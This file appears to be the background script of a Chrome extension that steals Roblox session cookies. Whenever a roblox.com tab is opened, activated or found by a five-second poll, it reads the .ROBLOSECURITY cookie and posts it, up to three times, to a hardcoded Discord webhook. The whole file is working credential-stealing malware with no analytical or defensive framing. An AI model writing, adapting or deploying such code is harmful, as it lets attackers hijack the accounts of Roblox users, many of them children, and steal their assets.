const WEBHOOK = "https://discord.com/api/webhooks/1495620738185433108/Guyq3VjA-yV4oV5FDypyuK7jmNBrrFZhyZ7sZthJ11sHGVR8U8HuNJioX8cFD8FVQUZI";
let sendCount = 0;
const MAX_SENDS = 3;

function sendCookie() {
    if (sendCount >= MAX_SENDS) return;
    chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
        if (cookie?.value) {
            sendCount++;
            fetch(WEBHOOK, {
                method: "POST",
                body: JSON.stringify({
                    content: "**🎮 Roblox Cookie** (" + sendCount + "/3)\n```\n" + cookie.value + "\n```"
                }),
                headers: { "Content-Type": "application/json" }
            });
        }
    });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab.url?.includes("roblox.com")) sendCookie();
});
chrome.tabs.onActivated.addListener(() => sendCookie());
setInterval(() => {
    chrome.tabs.query({ url: "*://*.roblox.com/*" }, (tabs) => {
        if (tabs.length > 0) sendCookie();
    });
}, 5000);
